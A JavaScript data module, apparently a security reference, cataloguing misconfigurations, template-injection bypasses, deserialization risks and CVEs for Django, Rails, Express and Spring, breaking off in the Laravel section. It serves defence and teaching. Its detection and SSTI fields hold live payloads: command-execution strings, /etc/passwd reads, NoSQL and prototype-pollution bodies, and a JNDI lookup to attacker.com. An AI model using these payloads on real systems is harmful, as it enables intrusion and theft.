// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Source-available for learning only. Redistribution prohibited. See LICENSE.
//
// Web Application Framework Security Reference Database
// Comprehensive vulnerability patterns, misconfigurations, and attack surfaces
// for major web frameworks used in production environments.

export const FRAMEWORK_SECURITY = {
  django: {
    name: "Django",
    language: "Python",
    version: "5.x",
    description: "High-level Python web framework that encourages rapid development and clean, pragmatic design.",
    securityFeatures: [
      { feature: "CSRF Protection", default: true, description: "Middleware-based CSRF token validation on POST/PUT/DELETE requests", config: "django.middleware.csrf.CsrfViewMiddleware" },
      { feature: "XSS Protection", default: true, description: "Template auto-escaping prevents most reflected/stored XSS", config: "Template engine auto-escape enabled by default" },
      { feature: "SQL Injection Protection", default: true, description: "ORM parameterized queries prevent SQLi in standard usage", config: "QuerySet API with parameterized queries" },
      { feature: "Clickjacking Protection", default: true, description: "X-Frame-Options DENY header via middleware", config: "django.middleware.clickjacking.XFrameOptionsMiddleware" },
      { feature: "Session Security", default: true, description: "Server-side sessions with signed cookies", config: "SESSION_COOKIE_HTTPONLY=True, SESSION_COOKIE_SECURE (manual)" },
      { feature: "Password Hashing", default: true, description: "PBKDF2 with SHA256 by default, supports Argon2/bcrypt/scrypt", config: "PASSWORD_HASHERS setting" },
      { feature: "Host Header Validation", default: false, description: "ALLOWED_HOSTS must be configured to prevent host header injection", config: "ALLOWED_HOSTS = ['yourdomain.com']" },
      { feature: "Content Type Nosniff", default: true, description: "X-Content-Type-Options: nosniff header", config: "SecurityMiddleware" },
      { feature: "HSTS", default: false, description: "HTTP Strict Transport Security header (must be manually enabled)", config: "SECURE_HSTS_SECONDS, SECURE_HSTS_INCLUDE_SUBDOMAINS" },
      { feature: "SSL Redirect", default: false, description: "Redirect all HTTP to HTTPS", config: "SECURE_SSL_REDIRECT = True" }
    ],
    commonMisconfigs: [
      {
        id: "DJANGO-MISC-001",
        title: "DEBUG = True in Production",
        severity: "critical",
        description: "Leaving DEBUG=True exposes detailed error pages with stack traces, local variables, settings, and installed apps to any user who triggers an error.",
        impact: "Full source code disclosure, database credentials, secret key exposure, internal path disclosure",
        detection: "Trigger a 404 or 500 error and check for Django debug page with yellow background",
        remediation: "Set DEBUG = False in production settings. Use environment variables: DEBUG = os.environ.get('DJANGO_DEBUG', 'False') == 'True'",
        cwe: "CWE-215: Insertion of Sensitive Information Into Debugging Code",
        references: ["https://docs.djangoproject.com/en/5.0/ref/settings/#debug"]
      },
      {
        id: "DJANGO-MISC-002",
        title: "SECRET_KEY Exposed or Default",
        severity: "critical",
        description: "Using the default SECRET_KEY from django-admin startproject or committing it to version control. The SECRET_KEY is used for cryptographic signing of sessions, CSRF tokens, password reset tokens, and signed cookies.",
        impact: "Session hijacking, CSRF bypass, password reset token forgery, signed cookie manipulation",
        detection: "Check settings.py for hardcoded SECRET_KEY, search git history for secret key commits",
        remediation: "Generate a strong random SECRET_KEY and store in environment variable: SECRET_KEY = os.environ['DJANGO_SECRET_KEY']. Use django.core.management.utils.get_random_secret_key() to generate.",
        cwe: "CWE-798: Use of Hard-coded Credentials"
      },
      {
        id: "DJANGO-MISC-003",
        title: "ALLOWED_HOSTS Wildcard or Empty",
        severity: "high",
        description: "Setting ALLOWED_HOSTS = ['*'] or leaving it empty with DEBUG=False. When DEBUG=False and ALLOWED_HOSTS is empty, Django returns 400 for all requests. With '*', it accepts any Host header.",
        impact: "Host header injection attacks, cache poisoning, password reset link manipulation, SSRF",
        detection: "Send request with arbitrary Host header: curl -H 'Host: evil.com' https://target.com/",
        remediation: "Set ALLOWED_HOSTS to specific domains: ALLOWED_HOSTS = ['yourdomain.com', 'www.yourdomain.com']",
        cwe: "CWE-20: Improper Input Validation"
      },
      {
        id: "DJANGO-MISC-004",
        title: "Insecure Database Configuration",
        severity: "high",
        description: "Using SQLite in production, database credentials in settings.py, or database accessible from the internet without authentication.",
        impact: "Data breach, unauthorized database access, data corruption",
        detection: "Check settings.py DATABASES configuration, verify database port exposure with nmap",
        remediation: "Use PostgreSQL/MySQL in production. Store credentials in environment variables. Restrict database access to application server IPs only.",
        cwe: "CWE-311: Missing Encryption of Sensitive Data"
      },
      {
        id: "DJANGO-MISC-005",
        title: "Missing SESSION_COOKIE_SECURE",
        severity: "medium",
        description: "SESSION_COOKIE_SECURE defaults to False, meaning session cookies are sent over HTTP connections.",
        impact: "Session hijacking via network sniffing on non-HTTPS connections",
        detection: "Check Set-Cookie header for Secure flag absence",
        remediation: "Set SESSION_COOKIE_SECURE = True and CSRF_COOKIE_SECURE = True in production settings",
        cwe: "CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute"
      },
      {
        id: "DJANGO-MISC-006",
        title: "Unrestricted File Upload",
        severity: "high",
        description: "Using FileField or ImageField without proper validation of file type, size, and content. Django does not validate file content by default.",
        impact: "Remote code execution via uploaded web shells, denial of service via large files, stored XSS via SVG/HTML uploads",
        detection: "Attempt to upload .py, .php, .html, .svg files through file upload forms",
        remediation: "Validate file extensions, MIME types, and file content. Set FILE_UPLOAD_MAX_MEMORY_SIZE. Store uploads outside web root. Use django-storages with S3/GCS.",
        cwe: "CWE-434: Unrestricted Upload of File with Dangerous Type"
      },
      {
        id: "DJANGO-MISC-007",
        title: "Admin Panel Exposed Without Protection",
        severity: "medium",
        description: "Django admin at default /admin/ URL without rate limiting, IP restriction, or two-factor authentication.",
        impact: "Brute force attacks on admin credentials, unauthorized admin access",
        detection: "Navigate to /admin/ and check for login form",
        remediation: "Change admin URL, add django-axes for rate limiting, implement 2FA with django-otp, restrict by IP with middleware",
        cwe: "CWE-307: Improper Restriction of Excessive Authentication Attempts"
      },
      {
        id: "DJANGO-MISC-008",
        title: "Raw SQL Queries Without Parameterization",
        severity: "critical",
        description: "Using raw() or cursor.execute() with string formatting instead of parameterized queries bypasses Django's ORM SQL injection protection.",
        impact: "SQL injection allowing data extraction, modification, or deletion",
        detection: "Search codebase for .raw(, cursor.execute(, .extra(, string formatting in queries",
        remediation: "Always use parameterized queries: Model.objects.raw('SELECT * FROM app_model WHERE id = %s', [user_id]). Never use f-strings or .format() in SQL.",
        cwe: "CWE-89: SQL Injection"
      }
    ],
    templateInjection: {
      engine: "Django Template Language (DTL)",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "{{ variable|safe }}", description: "The |safe filter marks content as safe, bypassing auto-escaping", risk: "high", example: "{{ user_input|safe }} — if user_input contains <script>alert(1)</script>, it executes" },
        { pattern: "{% autoescape off %}", description: "Disables auto-escaping for entire block", risk: "critical", example: "{% autoescape off %}{{ user_bio }}{% endautoescape %}" },
        { pattern: "mark_safe()", description: "Python function that marks string as safe HTML", risk: "high", example: "return mark_safe(f'<div>{user_input}</div>') — XSS if user_input not sanitized" },
        { pattern: "format_html()", description: "Safe alternative to mark_safe — escapes arguments but marks result as safe", risk: "low", example: "format_html('<div class=\"{}\">{}</div>', css_class, content)" }
      ],
      ssti: {
        vulnerable: false,
        explanation: "Django's template engine does not allow arbitrary Python execution. It restricts attribute access and does not support function calls with arguments in templates. SSTI is generally not possible in DTL.",
        caveat: "If Jinja2 is used as Django's template engine instead of DTL, SSTI becomes possible. Check TEMPLATES setting for 'django.template.backends.jinja2.Jinja2'."
      }
    },
    deserializationVulns: [
      {
        type: "Pickle Deserialization",
        severity: "critical",
        description: "Django's PickleSerializer for sessions allows remote code execution if an attacker can craft a malicious session cookie. Default changed to JSONSerializer in Django 1.6+.",
        detection: "Check SESSION_SERIALIZER setting for 'django.contrib.sessions.serializers.PickleSerializer'",
        remediation: "Use JSONSerializer (default): SESSION_SERIALIZER = 'django.contrib.sessions.serializers.JSONSerializer'",
        cve: "CVE-2020-9402 (related GIS SQL injection)"
      },
      {
        type: "YAML Deserialization",
        severity: "critical",
        description: "Using yaml.load() without Loader parameter on user-supplied YAML data allows arbitrary code execution.",
        detection: "Search for yaml.load( without Loader=yaml.SafeLoader",
        remediation: "Always use yaml.safe_load() or yaml.load(data, Loader=yaml.SafeLoader)"
      }
    ],
    authBypass: [
      {
        id: "DJANGO-AUTH-001",
        title: "Missing @login_required Decorator",
        description: "Views without authentication decorators are accessible to anonymous users",
        detection: "Review views.py for functions/classes missing @login_required or LoginRequiredMixin",
        example: "def sensitive_view(request): return render(request, 'sensitive.html', {'data': get_secret_data()})"
      },
      {
        id: "DJANGO-AUTH-002",
        title: "Broken Object-Level Authorization",
        description: "Views that check authentication but not object ownership allow users to access other users' data",
        detection: "Check views for missing user ownership verification: object = Model.objects.get(pk=pk) without filtering by request.user",
        example: "@login_required\ndef edit_profile(request, user_id):\n    profile = Profile.objects.get(user_id=user_id)  # No ownership check"
      },
      {
        id: "DJANGO-AUTH-003",
        title: "Password Reset Token Prediction",
        description: "Django uses HMAC with SECRET_KEY for password reset tokens. If SECRET_KEY is compromised, tokens can be forged.",
        detection: "Check if SECRET_KEY is hardcoded or has been exposed in git history",
        example: "If SECRET_KEY is known, attacker can generate valid password reset tokens for any user"
      }
    ],
    knownCVEPatterns: [
      { cve: "CVE-2023-36053", title: "ReDoS in EmailValidator/URLValidator", versions: "<4.2.3, <4.1.10, <3.2.20", description: "Regular expression denial of service via specially crafted email/URL strings" },
      { cve: "CVE-2023-31047", title: "Multiple file upload bypass", versions: "<4.2.1, <4.1.9, <3.2.19", description: "Uploading multiple files using one form field bypasses validation" },
      { cve: "CVE-2022-34265", title: "SQL Injection in Trunc/Extract", versions: "<4.0.6, <3.2.14", description: "SQL injection via crafted kind/lookup_name in Trunc() and Extract() database functions" },
      { cve: "CVE-2021-45115", title: "DoS via UserAttributeSimilarityValidator", versions: "<4.0.1, <3.2.11, <2.2.26", description: "Denial of service via large passwords that trigger excessive computation" },
      { cve: "CVE-2021-44420", title: "Path traversal in URL resolver", versions: "<3.2.10, <3.1.14, <2.2.25", description: "Potential directory traversal via crafted URLs" },
      { cve: "CVE-2021-35042", title: "SQL Injection in QuerySet.order_by()", versions: "<3.2.5, <3.1.13, <2.2.24", description: "SQL injection via untrusted data passed to order_by()" },
      { cve: "CVE-2019-14232", title: "ReDoS in django.utils.text.Truncator", versions: "<2.2.4, <2.1.11, <1.11.23", description: "Regular expression denial of service in Truncator.words()" }
    ],
    securityHeaders: {
      recommended: [
        { header: "X-Content-Type-Options", value: "nosniff", config: "SECURE_CONTENT_TYPE_NOSNIFF = True (default True since 3.0)" },
        { header: "X-Frame-Options", value: "DENY", config: "X_FRAME_OPTIONS = 'DENY' (default)" },
        { header: "Strict-Transport-Security", value: "max-age=31536000; includeSubDomains; preload", config: "SECURE_HSTS_SECONDS = 31536000, SECURE_HSTS_INCLUDE_SUBDOMAINS = True, SECURE_HSTS_PRELOAD = True" },
        { header: "Content-Security-Policy", value: "default-src 'self'", config: "Use django-csp middleware: CSP_DEFAULT_SRC = (\"'self'\",)" },
        { header: "Referrer-Policy", value: "same-origin", config: "SECURE_REFERRER_POLICY = 'same-origin' (default since 3.1)" },
        { header: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()", config: "Custom middleware or django-permissions-policy" },
        { header: "Cross-Origin-Opener-Policy", value: "same-origin", config: "SECURE_CROSS_ORIGIN_OPENER_POLICY = 'same-origin' (default since 4.0)" }
      ]
    }
  },

  rails: {
    name: "Ruby on Rails",
    language: "Ruby",
    version: "7.x",
    description: "Server-side web application framework written in Ruby, following the MVC pattern.",
    securityFeatures: [
      { feature: "CSRF Protection", default: true, description: "Authenticity token verification on non-GET requests", config: "protect_from_forgery with: :exception" },
      { feature: "XSS Protection", default: true, description: "ERB auto-escaping with html_safe marking", config: "Auto-escape in ERB templates by default" },
      { feature: "SQL Injection Protection", default: true, description: "ActiveRecord parameterized queries", config: "ActiveRecord query interface" },
      { feature: "Mass Assignment Protection", default: true, description: "Strong Parameters require explicit parameter whitelisting", config: "params.require(:user).permit(:name, :email)" },
      { feature: "Session Security", default: true, description: "Encrypted and signed cookies for session storage", config: "config.session_store :cookie_store" },
      { feature: "Content Security Policy", default: false, description: "Built-in CSP DSL for defining policies", config: "config.content_security_policy do |policy| ... end" },
      { feature: "Credential Encryption", default: true, description: "Rails credentials encrypted with master key", config: "config/credentials.yml.enc + config/master.key" }
    ],
    commonMisconfigs: [
      {
        id: "RAILS-MISC-001",
        title: "Exposed config/master.key",
        severity: "critical",
        description: "The master.key file decrypts credentials.yml.enc containing database passwords, API keys, and secrets. If committed to git or exposed, all credentials are compromised.",
        impact: "Full credential disclosure including database passwords, API keys, secret_key_base",
        detection: "Check git history: git log --all --full-history -- config/master.key",
        remediation: "Add config/master.key to .gitignore. Rotate all credentials if exposed. Use RAILS_MASTER_KEY environment variable in production.",
        cwe: "CWE-312: Cleartext Storage of Sensitive Information"
      },
      {
        id: "RAILS-MISC-002",
        title: "Development Mode in Production",
        severity: "critical",
        description: "Running Rails in development mode (RAILS_ENV=development) in production exposes detailed error pages, enables code reloading, and disables caching.",
        impact: "Source code disclosure, internal path exposure, reduced security controls",
        detection: "Trigger an error and check for Rails error page with source code excerpts",
        remediation: "Ensure RAILS_ENV=production in production. Check with: Rails.env.production?"
      },
      {
        id: "RAILS-MISC-003",
        title: "Unscoped ActiveRecord Finds",
        severity: "high",
        description: "Using Model.find(params[:id]) instead of current_user.models.find(params[:id]) allows IDOR attacks.",
        impact: "Unauthorized access to other users' records",
        detection: "Search for Model.find(params without scoping: grep -r 'find(params' app/controllers/",
        remediation: "Always scope queries to the current user: current_user.posts.find(params[:id])"
      },
      {
        id: "RAILS-MISC-004",
        title: "Unsafe Deserialization via YAML/Marshal",
        severity: "critical",
        description: "Rails historically used YAML for parameter parsing and Marshal for cookie serialization, both allowing RCE.",
        impact: "Remote code execution on the server",
        detection: "Check for YAML.load() on user input, Marshal.load() on untrusted data, config.action_dispatch.cookies_serializer = :marshal",
        remediation: "Use YAML.safe_load(). Set cookies_serializer to :json. Never deserialize untrusted data with Marshal."
      },
      {
        id: "RAILS-MISC-005",
        title: "Open Redirect via redirect_to",
        severity: "medium",
        description: "Using redirect_to with user-controlled URLs without validation allows open redirects.",
        impact: "Phishing attacks by redirecting users to malicious sites after authentication",
        detection: "Search for redirect_to params[: or redirect_to request.",
        remediation: "Validate redirect URLs against a whitelist. Use redirect_to with only_path: true for internal redirects."
      }
    ],
    templateInjection: {
      engine: "ERB (Embedded Ruby)",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "raw()", description: "Outputs unescaped HTML", risk: "high", example: "<%= raw user_input %>" },
        { pattern: "html_safe", description: "Marks string as safe HTML", risk: "high", example: "<%= user_input.html_safe %>" },
        { pattern: "<%== %>", description: "Shorthand for raw output (same as raw())", risk: "high", example: "<%== user_comment %>" },
        { pattern: "content_tag with user input", description: "content_tag escapes values but not always attributes", risk: "medium", example: "content_tag(:div, nil, data: { value: user_input })" }
      ],
      ssti: {
        vulnerable: true,
        explanation: "ERB allows arbitrary Ruby execution. If user input is rendered through ERB (e.g., ERB.new(user_input).result), full RCE is possible.",
        payload: "<%= system('id') %> or <%= `whoami` %> or <%= File.read('/etc/passwd') %>"
      }
    },
    deserializationVulns: [
      {
        type: "Marshal Deserialization",
        severity: "critical",
        description: "Ruby's Marshal.load() on untrusted data allows arbitrary code execution through crafted serialized objects.",
        detection: "Search for Marshal.load on user-controllable data, check cookie serializer setting",
        remediation: "Never use Marshal.load on untrusted data. Use JSON for serialization.",
        cve: "CVE-2013-0156 (Rails XML/YAML parameter parsing RCE)"
      },
      {
        type: "YAML Deserialization",
        severity: "critical",
        description: "YAML.load() in Ruby can instantiate arbitrary Ruby objects including Gem::Requirement which chains to exec().",
        detection: "Search for YAML.load( without safe mode",
        remediation: "Use YAML.safe_load() which restricts allowed classes",
        cve: "CVE-2013-0156"
      }
    ],
    knownCVEPatterns: [
      { cve: "CVE-2023-22796", title: "ReDoS in Active Support", versions: "<7.0.4.1, <6.1.7.1", description: "Regular expression denial of service in Active Support's underscore method" },
      { cve: "CVE-2023-22795", title: "ReDoS in Action Dispatch", versions: "<7.0.4.1, <6.1.7.1", description: "Regular expression denial of service in header parsing" },
      { cve: "CVE-2022-32224", title: "Unsafe YAML deserialization in ActiveRecord", versions: "<7.0.3.1", description: "Possible RCE via YAML column type deserialization" },
      { cve: "CVE-2022-23633", title: "Information leak in Action Pack", versions: "<7.0.2.2, <6.1.4.6, <6.0.4.6, <5.2.6.2", description: "Response body leaking between requests under certain conditions" },
      { cve: "CVE-2021-22904", title: "DoS via Accept header", versions: "<6.1.3.2, <6.0.3.7, <5.2.4.6, <5.2.6", description: "Denial of service via specially crafted Accept headers" },
      { cve: "CVE-2020-8163", title: "Code injection via locals in render", versions: "<6.0.3, <5.2.4.3", description: "Code injection through Action View's locals hash" },
      { cve: "CVE-2019-5418", title: "File content disclosure in Action View", versions: "<5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1", description: "Read arbitrary files via Accept header manipulation" }
    ]
  },

  express: {
    name: "Express.js",
    language: "JavaScript/Node.js",
    version: "4.x / 5.x",
    description: "Minimal and flexible Node.js web application framework providing a robust set of features for web and mobile applications.",
    securityFeatures: [
      { feature: "CSRF Protection", default: false, description: "No built-in CSRF protection — requires csurf or lusca middleware", config: "npm install csurf" },
      { feature: "XSS Protection", default: false, description: "No built-in template escaping — depends on template engine (EJS, Pug, Handlebars)", config: "Template-engine-dependent" },
      { feature: "SQL Injection Protection", default: false, description: "No ORM — depends on database driver/ORM choice (Sequelize, Prisma, Knex)", config: "Use parameterized queries with your DB driver" },
      { feature: "Helmet Security Headers", default: false, description: "Helmet.js middleware sets security headers", config: "npm install helmet; app.use(helmet())" },
      { feature: "Rate Limiting", default: false, description: "No built-in rate limiting — requires express-rate-limit", config: "npm install express-rate-limit" },
      { feature: "CORS", default: false, description: "No built-in CORS — requires cors middleware", config: "npm install cors" }
    ],
    commonMisconfigs: [
      {
        id: "EXPRESS-MISC-001",
        title: "Missing Helmet.js Security Headers",
        severity: "medium",
        description: "Express sends minimal security headers by default. Without Helmet, responses lack X-Content-Type-Options, X-Frame-Options, CSP, HSTS, etc.",
        impact: "Vulnerable to clickjacking, MIME sniffing, missing HSTS, missing CSP",
        detection: "Check response headers for absence of security headers",
        remediation: "Install and use Helmet: const helmet = require('helmet'); app.use(helmet());"
      },
      {
        id: "EXPRESS-MISC-002",
        title: "X-Powered-By Header Disclosure",
        severity: "low",
        description: "Express sends X-Powered-By: Express header by default, disclosing the framework.",
        impact: "Information disclosure helps attackers target framework-specific vulnerabilities",
        detection: "Check response headers for X-Powered-By",
        remediation: "app.disable('x-powered-by') or use Helmet which removes it automatically"
      },
      {
        id: "EXPRESS-MISC-003",
        title: "Detailed Error Messages in Production",
        severity: "medium",
        description: "Express shows stack traces in error responses when NODE_ENV is not set to 'production'.",
        impact: "Internal path disclosure, dependency version exposure, potential credential leaks in stack traces",
        detection: "Trigger a server error and check response for stack traces",
        remediation: "Set NODE_ENV=production. Use custom error handler: app.use((err, req, res, next) => { res.status(500).json({ error: 'Internal Server Error' }); });"
      },
      {
        id: "EXPRESS-MISC-004",
        title: "CORS Wildcard with Credentials",
        severity: "high",
        description: "Setting Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true. Browsers block this combination, but misconfigured CORS reflecting the Origin header with credentials allowed is exploitable.",
        impact: "Cross-origin data theft via authenticated requests from attacker-controlled pages",
        detection: "Send requests with different Origin headers and check if they're reflected in ACAO",
        remediation: "Whitelist specific origins. Never reflect arbitrary Origin with credentials: true."
      },
      {
        id: "EXPRESS-MISC-005",
        title: "Path Traversal via Static Files",
        severity: "high",
        description: "Misconfigured express.static() or custom file-serving routes allowing directory traversal.",
        impact: "Read arbitrary files from the server filesystem",
        detection: "Try path traversal: GET /static/../../../etc/passwd",
        remediation: "Use express.static() with proper root. Validate and sanitize file paths. Use path.resolve() and check the result starts with the intended directory."
      },
      {
        id: "EXPRESS-MISC-006",
        title: "Prototype Pollution via Body Parser",
        severity: "high",
        description: "Express body parsers (JSON) can be exploited for prototype pollution by sending __proto__ or constructor.prototype payloads in JSON bodies.",
        impact: "Property injection leading to authentication bypass, RCE, or denial of service depending on application logic",
        detection: "Send POST with body: {\"__proto__\": {\"isAdmin\": true}} and check if Object.prototype is polluted",
        remediation: "Use --disable-proto=throw Node.js flag. Validate/sanitize input objects. Use Object.create(null) for lookup maps."
      },
      {
        id: "EXPRESS-MISC-007",
        title: "Missing Rate Limiting",
        severity: "medium",
        description: "No rate limiting on authentication endpoints, API routes, or resource-intensive operations.",
        impact: "Brute force attacks, credential stuffing, denial of service",
        detection: "Send rapid requests to login endpoint and check for rate limiting response (429)",
        remediation: "Use express-rate-limit: const rateLimit = require('express-rate-limit'); app.use('/api/', rateLimit({ windowMs: 15*60*1000, max: 100 }));"
      },
      {
        id: "EXPRESS-MISC-008",
        title: "NoSQL Injection via MongoDB",
        severity: "critical",
        description: "When using MongoDB with Express, query operators ($gt, $ne, $regex) in JSON body can bypass authentication or extract data.",
        impact: "Authentication bypass, data extraction, denial of service",
        detection: "POST {\"username\": {\"$ne\": \"\"}, \"password\": {\"$ne\": \"\"}} to login endpoint",
        remediation: "Validate input types. Use mongo-sanitize: const sanitize = require('mongo-sanitize'); sanitize(req.body);"
      }
    ],
    templateInjection: {
      engine: "Multiple (EJS, Pug, Handlebars, Nunjucks)",
      autoEscape: "varies",
      bypassPatterns: [
        { pattern: "<%- %> (EJS)", description: "Unescaped output in EJS templates", risk: "high", example: "<%- user_input %> renders raw HTML" },
        { pattern: "!{} (Pug)", description: "Unescaped output in Pug templates", risk: "high", example: "p!= user_input" },
        { pattern: "{{{ }}} (Handlebars)", description: "Triple braces for unescaped output in Handlebars", risk: "high", example: "{{{ user_bio }}}" },
        { pattern: "| safe (Nunjucks)", description: "Safe filter bypasses auto-escaping in Nunjucks", risk: "high", example: "{{ user_input | safe }}" }
      ],
      ssti: {
        vulnerable: true,
        explanation: "If user input is passed directly to template compilation (e.g., ejs.render(userInput)), arbitrary code execution is possible in most Node.js template engines.",
        payload: "EJS: <% process.mainModule.require('child_process').execSync('id') %>\nPug: #{process.mainModule.require('child_process').execSync('id')}"
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2024-29041", title: "Open Redirect in Express", versions: "<4.19.2, <5.0.0-beta.3", description: "Open redirect via specially crafted URL with backslashes" },
      { cve: "CVE-2022-24999", title: "Prototype Pollution in qs", versions: "qs <6.10.3", description: "Prototype pollution via crafted query string parameters" },
      { cve: "CVE-2019-10744", title: "Prototype Pollution in lodash", versions: "lodash <4.17.12", description: "Prototype pollution in lodash.merge/defaultsDeep (commonly used with Express)" },
      { cve: "CVE-2017-14849", title: "Path traversal in static serve", versions: "<4.15.5", description: "Path traversal vulnerability when serving static files on Windows" }
    ]
  },

  spring: {
    name: "Spring Boot / Spring Framework",
    language: "Java",
    version: "3.x / 6.x",
    description: "Comprehensive Java framework for enterprise application development with convention-over-configuration approach.",
    securityFeatures: [
      { feature: "Spring Security", default: false, description: "Comprehensive authentication and authorization framework (must be added as dependency)", config: "spring-boot-starter-security dependency" },
      { feature: "CSRF Protection", default: true, description: "Enabled by default when Spring Security is added", config: "http.csrf() in SecurityFilterChain" },
      { feature: "SQL Injection Protection", default: true, description: "JPA/Hibernate parameterized queries", config: "Spring Data JPA repository queries" },
      { feature: "Password Encoding", default: false, description: "BCryptPasswordEncoder available but must be configured", config: "@Bean PasswordEncoder passwordEncoder() { return new BCryptPasswordEncoder(); }" },
      { feature: "CORS Configuration", default: false, description: "Restrictive by default — must be explicitly configured", config: "@CrossOrigin or CorsConfigurationSource bean" },
      { feature: "Content Security Policy", default: false, description: "Available through Spring Security headers configuration", config: "http.headers().contentSecurityPolicy(\"default-src 'self'\")" },
      { feature: "Actuator Security", default: false, description: "Spring Boot Actuator endpoints are restricted by default in 2.x+ but must be secured", config: "management.endpoints.web.exposure.include/exclude" }
    ],
    commonMisconfigs: [
      {
        id: "SPRING-MISC-001",
        title: "Exposed Spring Boot Actuator Endpoints",
        severity: "critical",
        description: "Spring Boot Actuator provides /actuator/env, /actuator/configprops, /actuator/heapdump, /actuator/beans, and /actuator/mappings endpoints that can expose secrets, heap dumps, and application internals.",
        impact: "Credential disclosure via /env, memory dump analysis via /heapdump, application mapping disclosure, potential RCE via /jolokia or /gateway",
        detection: "Probe /actuator, /actuator/env, /actuator/heapdump, /actuator/health with GET requests",
        remediation: "Restrict actuator endpoints: management.endpoints.web.exposure.include=health,info. Secure with Spring Security. Use management.server.port for separate port."
      },
      {
        id: "SPRING-MISC-002",
        title: "SpEL Injection",
        severity: "critical",
        description: "Spring Expression Language (SpEL) injection occurs when user input is evaluated as a SpEL expression, allowing arbitrary code execution.",
        impact: "Remote code execution on the application server",
        detection: "Input ${7*7} or T(java.lang.Runtime).getRuntime().exec('id') in user-controlled fields",
        remediation: "Never evaluate user input as SpEL. Use SimpleEvaluationContext instead of StandardEvaluationContext. Validate and sanitize inputs."
      },
      {
        id: "SPRING-MISC-003",
        title: "Mass Assignment via @ModelAttribute",
        severity: "high",
        description: "Spring MVC's data binding automatically maps request parameters to object properties. Without a whitelist, attackers can set unintended fields like 'role' or 'isAdmin'.",
        impact: "Privilege escalation, data manipulation",
        detection: "Send extra parameters in form submission: POST /register?username=test&password=test&role=ADMIN",
        remediation: "Use @InitBinder with setAllowedFields() or setDisallowedFields(). Use DTOs instead of entity objects for binding."
      },
      {
        id: "SPRING-MISC-004",
        title: "Exposed H2 Console",
        severity: "critical",
        description: "H2 in-memory database console enabled and accessible in production at /h2-console.",
        impact: "Direct database access, SQL execution, potential RCE via H2 CREATE ALIAS",
        detection: "Navigate to /h2-console",
        remediation: "Disable in production: spring.h2.console.enabled=false. Never use H2 in production."
      },
      {
        id: "SPRING-MISC-005",
        title: "Permissive Security Filter Chain",
        severity: "high",
        description: "Overly permissive Spring Security configuration such as .anyRequest().permitAll() or disabled security for debugging.",
        impact: "Unauthorized access to protected endpoints and resources",
        detection: "Review SecurityFilterChain bean configuration",
        remediation: "Use restrictive defaults: .anyRequest().authenticated(). Whitelist only public endpoints."
      },
      {
        id: "SPRING-MISC-006",
        title: "JNDI Injection (Log4Shell pattern)",
        severity: "critical",
        description: "JNDI lookup injection through user-controlled data that reaches JNDI resolution, similar to Log4Shell (CVE-2021-44228).",
        impact: "Remote code execution via LDAP/RMI JNDI lookup",
        detection: "Input ${jndi:ldap://attacker.com/exploit} in user-controlled fields",
        remediation: "Update Log4j to 2.17.1+. Disable JNDI lookups. Set log4j2.formatMsgNoLookups=true."
      }
    ],
    templateInjection: {
      engine: "Thymeleaf",
      autoEscape: true,
      bypassPatterns: [
        { pattern: "th:utext", description: "Unescaped text output in Thymeleaf", risk: "high", example: "<p th:utext=\"${user_input}\">placeholder</p>" },
        { pattern: "th:attr with event handlers", description: "Setting event handler attributes with user input", risk: "high", example: "<div th:attr=\"onclick=${user_input}\">Click</div>" },
        { pattern: "Thymeleaf fragment injection", description: "User-controlled template path in th:replace or th:include", risk: "critical", example: "<div th:replace=\"${user_input}\">...</div>" }
      ],
      ssti: {
        vulnerable: true,
        explanation: "Thymeleaf processes SpEL expressions in templates. If template path or content is user-controlled, RCE is possible through SpEL injection.",
        payload: "__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x"
      }
    },
    knownCVEPatterns: [
      { cve: "CVE-2024-22234", title: "Broken Access Control in Spring Security", versions: "6.1.0-6.1.6", description: "AuthenticationTrustResolver.isFullyAuthenticated returns incorrect result" },
      { cve: "CVE-2022-22965", title: "Spring4Shell RCE", versions: "<5.3.18", description: "RCE via data binding to ClassLoader on JDK 9+ with Tomcat" },
      { cve: "CVE-2022-22963", title: "Spring Cloud Function SpEL RCE", versions: "<3.1.7, <3.2.3", description: "RCE via spring.cloud.function.routing-expression header" },
      { cve: "CVE-2022-22947", title: "Spring Cloud Gateway SpEL Code Injection", versions: "<3.1.1, <3.0.7", description: "Code injection via Spring Cloud Gateway Actuator API" },
      { cve: "CVE-2021-44228", title: "Log4Shell", versions: "Log4j <2.17.0", description: "JNDI injection RCE via log messages (affects Spring apps using Log4j)" },
      { cve: "CVE-2018-1270", title: "Spring WebSocket RCE", versions: "<5.0.5, <4.3.16", description: "RCE via SpEL injection in STOMP WebSocket message headers" }
    ]
  },

  laravel: {
    name: "Laravel",
    language: "PHP",
    version: "11.x",
    description: "PHP web application framework with expressive, elegant syntax following the MVC pattern.",
    securityFeatures: [
      { feature: "CSRF Protection", default: true, description: "VerifyCsrfToken middleware with per-session tokens", config: "App\\Http\\Middleware\\VerifyCsrfToken" },
      { feature: "XSS Protection", default: true, description: "Blade template engine auto-escapes with {{ }}", config: "Blade {{ }} uses htmlspecialchars()" },
      { feature: "SQL Injection Protection", default: true, description: "Eloquent ORM and Query Builder use PDO parameter binding", config: "Eloquent and DB::select() with bindings" },
      { feature: "Password Hashing", default: true, description: "Bcrypt by default, supports Argon2id", config: "Hash::make() facade" },
      { feature: "Encryption", default: true, description: "AES-256-CBC encryption with application key", config: "APP_KEY in .env, Crypt facade" },
      { feature: "Mass Assignment Protection", default: true, description: "Eloquent requires $fillable or $guarded on models", config: "$fillable = ['name', 'email'] on Model" },
      { feature: "Rate Limiting", default: true, description: "Built-in rate limiting middleware", config: "RateLimiter::for() in RouteServiceProvider" },
      { feature: "Authentication Scaffolding", default: false, description: "Breeze/Jetstream/Fortify for complete auth systems", config: "composer require laravel/breeze" }
    ],
    commonMisconfigs: [
      {
        id: "LARAVEL-MISC-001",
        title: "APP_DEBUG = true in Production",
        severity: "critical",
        description: "Ignition error page (Laravel 9+) or Whoops (Laravel <9) displays detailed stack traces, environment variables, database credentials, and application secrets.",
        impact: "Full credential disclosure, APP_KEY exposure, database connection strings, internal path disclosure",
        detection: "Trigger a 500 error (e.g., invalid route parameter) and check for Ignition/Whoops error page",
